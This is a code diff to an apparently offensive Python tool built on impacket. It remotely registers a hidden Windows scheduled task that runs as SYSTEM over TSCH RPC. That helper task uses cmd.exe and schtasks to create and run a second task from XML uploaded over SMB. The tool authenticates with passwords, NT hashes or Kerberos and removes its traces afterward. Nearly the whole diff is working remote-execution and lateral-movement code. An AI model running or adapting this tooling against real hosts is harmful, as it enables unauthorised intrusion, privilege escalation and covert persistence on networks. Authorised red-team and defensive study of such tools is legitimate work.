@@ -993,14 +993,58 @@ def tsch_connect(ip, username, password, nt_hash, domain,
     return dce
 
 
-def tsch_register_and_run(dce, task_name, task_xml):
+TSCH_HELPER_XML = """\
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+<RegistrationInfo><URI>\\{helper_name}</URI></RegistrationInfo>
+<Triggers>
+   <RegistrationTrigger><Enabled>true</Enabled></RegistrationTrigger>
+</Triggers>
+<Principals>
+   <Principal id="LocalSystem">
+   <UserId>S-1-5-18</UserId>
+   <RunLevel>HighestAvailable</RunLevel>
+   </Principal>
+</Principals>
+<Settings>
+   <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+   <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+   <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+   <AllowHardTerminate>true</AllowHardTerminate>
+   <Hidden>true</Hidden>
+   <ExecutionTimeLimit>PT1M</ExecutionTimeLimit>
+   <AllowStartOnDemand>true</AllowStartOnDemand>
+   <Enabled>true</Enabled>
+</Settings>
+<Actions Context="LocalSystem">
+   <Exec>
+   <Command>cmd.exe</Command>
+   <Arguments>/c schtasks /create /xml "{xml_path}" /tn "{task_name}" /f &amp;&amp; schtasks /run /tn "{task_name}"</Arguments>
+   </Exec>
+</Actions>
+</Task>
+"""
+
+
+def tsch_register_and_run(dce, task_name, drop_dir, prefix):
     from impacket.dcerpc.v5 import tsch as _tsch
     from impacket.dcerpc.v5.dtypes import NULL
 
-    path = f'\\{task_name}'
-    _tsch.hSchRpcRegisterTask(dce, path, task_xml,
+    helper_name = f"{task_name}_init"
+    xml_path = f"{drop_dir}\\{prefix}.xml"
+
+    helper_xml = TSCH_HELPER_XML.format(
+        helper_name=helper_name, xml_path=xml_path, task_name=task_name)
+
+    helper_path = f'\\{helper_name}'
+    _tsch.hSchRpcRegisterTask(dce, helper_path, helper_xml,
                               _tsch.TASK_CREATE, NULL, _tsch.TASK_LOGON_NONE)
-    _tsch.hSchRpcRun(dce, path)
+    _tsch.hSchRpcRun(dce, helper_path)
+    time.sleep(3)
+    try:
+        _tsch.hSchRpcDelete(dce, helper_path)
+    except Exception:
+        pass
 
 
 def tsch_delete(dce, task_name):
@@ -1029,11 +1073,11 @@ def enum_sessions_rpc(ip, username, password, nt_hash, domain,
         rpc.set_credentials(username, password or "", domain, lm, nt, aes_key)
         rpc.set_kerberos(use_krb, dc_ip)
     dce = rpc.get_dce_rpc()
-    dce.set_credentials(*rpc.get_credentials())
     if use_krb:
+        dce.set_credentials(*rpc.get_credentials())
         dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
     dce.connect()
-    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
     dce.bind(_wkst.MSRPC_UUID_WKST)
 
     resp = _wkst.hNetrWkstaUserEnum(dce, 1)
@@ -1348,13 +1392,7 @@ def main():
     ad_domain = None
 
     if use_tsch:
-        info("Connecting via TSCH RPC...")
-        try:
-            dce = tsch_connect(ip, args.username, args.password, args.nt_hash,
-                               args.domain, args.aes_key, args.kerberos, args.dc_ip)
-        except Exception as e:
-            die(f"TSCH RPC connection failed: {e}")
-        info("Connected")
+        info("Connecting via SMB...")
         ad_domain = args.domain if "." in (args.domain or "") else None
     elif use_susinternals:
         info("Connecting via SMB (PSExeSVC)...")
@@ -1432,12 +1470,6 @@ def main():
         target_user, user_domain, args.ca, template,
         args.prefix, args.drop_dir, args.exec_wrapper)
 
-    # Upload files (TSCH doesn't need the XML on disk — it's sent via RPC)
-    task_xml_content = None
-    if use_tsch:
-        xml_key = f"{args.prefix}.xml"
-        task_xml_content = files.pop(xml_key).decode("utf-16")
-
     smb_delete_files(smb, args.drop_dir, args.prefix)
     try:
         smb_upload(smb, files, args.drop_dir)
@@ -1448,7 +1480,10 @@ def main():
     # Create and trigger scheduled task
     if use_tsch:
         try:
-            tsch_register_and_run(dce, args.task_name, task_xml_content)
+            dce = tsch_connect(ip, args.username, args.password, args.nt_hash,
+                               args.domain, args.aes_key, args.kerberos, args.dc_ip)
+            tsch_register_and_run(dce, args.task_name, args.drop_dir, args.prefix)
+            dce.disconnect()
         except Exception as e:
             die(f"TSCH task creation failed: {e}")
         info(f"Task '{args.task_name}' created and triggered via RPC")
@@ -1481,7 +1516,14 @@ def main():
                     info(f"  {args.prefix}.{ext} NOT found")
             if not args.no_cleanup:
                 if use_tsch:
-                    tsch_delete(dce, args.task_name)
+                    try:
+                        dce2 = tsch_connect(ip, args.username, args.password,
+                                            args.nt_hash, args.domain,
+                                            args.aes_key, args.kerberos, args.dc_ip)
+                        tsch_delete(dce2, args.task_name)
+                        dce2.disconnect()
+                    except Exception:
+                        pass
                     smb_delete_files(smb, args.drop_dir, args.prefix)
                 else:
                     cleanup_remote(transport, smb, args.task_name,
@@ -1507,17 +1549,18 @@ def main():
     # Cleanup
     if not args.no_cleanup:
         if use_tsch:
-            tsch_delete(dce, args.task_name)
+            try:
+                dce2 = tsch_connect(ip, args.username, args.password,
+                                    args.nt_hash, args.domain,
+                                    args.aes_key, args.kerberos, args.dc_ip)
+                tsch_delete(dce2, args.task_name)
+                dce2.disconnect()
+            except Exception:
+                pass
             smb_delete_files(smb, args.drop_dir, args.prefix)
         else:
             cleanup_remote(transport, smb, args.task_name,
                            args.drop_dir, args.prefix)
-
-    if dce:
-        try:
-            dce.disconnect()
-        except Exception:
-            pass
     if hasattr(transport, 'close'):
         transport.close()
 
